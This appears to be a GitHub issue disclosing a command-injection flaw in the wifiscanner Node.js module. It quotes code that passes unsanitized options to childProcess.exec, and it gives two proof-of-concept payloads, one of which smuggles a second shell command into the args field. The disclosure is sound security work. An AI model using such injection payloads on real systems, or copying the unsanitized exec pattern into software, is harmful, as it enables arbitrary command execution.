# Remote Code Execution Bug due to Improper Input Sanitization #1

## Description

![@AbhishekHerle](https://avatars.githubusercontent.com/u/5360970?v=4&size=48)[AbhishekHerle](https://github.com/AbhishekHerle)opened [on Jun 11, 2020](https://github.com/thingsSDK/wifiscanner/issues/1#issue-636686417)

This module can be used with options that can be used to overwrite default executable/binary path and arguments to the said executable/binary. An attacker can abuse this functionality to have the module execute a binary of their choice.

The following code snippets in the wifiscanner.js is responsible for the issue.

```
scan(callback, standardErrorCallback) {
childProcess.exec(this.command, (error, standardOut, standardError) => {
if (standardError && typeof standardErrorCallback === "function") {
standardErrorCallback(standardError);
}
callback(error, this.parse(standardOut.toString()));
});
}

get command() {
return this.options.binaryPath + " " + this.options.args;
}

```

As we can see, ***this.command*** is not sanitized in anyway prior to being passed to the ***exec()***.

Hence, the following payloads can be used to execute arbitrary commands:

**Exploit 1:**

```
let wifiscanner = require("wifiscanner");
let options = {
args: ";/bin/touch /tmp/exploit.txt;#"
}
let scanner = wifiscanner(options);
scanner.scan(function(error, networks){});

```

**Exploit 2:**

```
let wifiscanner = require("wifiscanner");
let options = {
args: "/tmp/exploit.txt",
binaryPath: "/bin/touch"
}
let scanner = wifiscanner(options);
scanner.scan(function(error, networks){});

```

User input must be appropriately sanitized prior to being passed to the module. At the very least users must be advised to manually sanitize user inputs when using this module.
